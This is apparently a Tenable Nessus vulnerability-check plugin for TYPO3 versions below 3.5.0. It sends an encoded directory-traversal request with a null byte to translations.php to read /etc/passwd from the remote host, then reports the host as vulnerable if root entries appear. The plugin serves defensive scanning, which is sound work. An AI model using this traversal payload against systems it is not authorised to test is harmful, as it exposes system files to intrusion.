#
# (C) Tenable Network Security, Inc.
#

# From: Martin Eiszner <martin@websec.org>
# To: bugtraq@securityfocus.com
# Subject: typo3 issues
# Message-Id: <20030228103704.1b657228.martin@websec.org>

include("compat.inc");

if (description)
{
  script_id(11284);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2014/09/30 14:12:37 $");

  script_bugtraq_id(
    6982,
    6983,
    6984,
    6985,
    6986,
    6988,
    6993
  );
  script_osvdb_id(
    54043,
    54044,
    54045,
    54046,
    54047,
    54048,
    54049,
    54050
  );

  script_name(english:"TYPO3 < 3.5.0 Multiple Vulnerabilities");
  script_summary(english:"Reads '/etc/passwd'.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host has a PHP script that is affected by multiple
vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The remote host is running an old version of TYPO3.

An attacker can use it to read arbitrary files and execute arbitrary
commands on this host.");
  script_set_attribute(attribute:"solution", value:"Upgrade to TYPO3 3.5.0.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2003/02/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:typo3:typo3");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2003-2014 Tenable Network Security, Inc.");

  script_dependencie("typo3_detect.nasl");
  script_require_keys("installed_sw/TYPO3", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "TYPO3";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url = build_url(qs:dir, port:port);

file = "/etc/passwd";

url = dir+'/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e' + file + '%00';
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

if (egrep(pattern:".*root:.*:0:[01]:.*", string:res[2]))
{
  if (report_verbosity > 0)
  {
    report = get_vuln_report(items:url, port:port);
    if (report_verbosity > 1)
    {
      if (
        !defined_func("nasl_level") ||
        nasl_level() < 5200 ||
        !isnull(get_preference("sc_version"))
      )
      {
        report +=
          '\n' + 'This produced the following truncated output :' +
          '\n' + snip +
          '\n' + beginning_of_response(resp:res[2], max_lines:'10') +
          '\n' + snip +
          '\n';
        security_hole(port:port, extra:report);
      }
      else
      {
        # Sanitize file names
        if ("/" >< file) file = ereg_replace(
          pattern:"^.+/([^/]+)$", replace:"\1", string:file);
        report +=
          '\n' + 'Attached is a copy of the response' + '\n';
        attachments = make_list();
        attachments[0] = make_array();
        attachments[0]["type"] = "text/plain";
        attachments[0]["name"] = file;
        attachments[0]["value"] = chomp(res[2]);
        security_report_with_attachments(
          port  : port,
          level : 3,
          extra : report,
          attachments : attachments
        );
      }
    }
    else security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
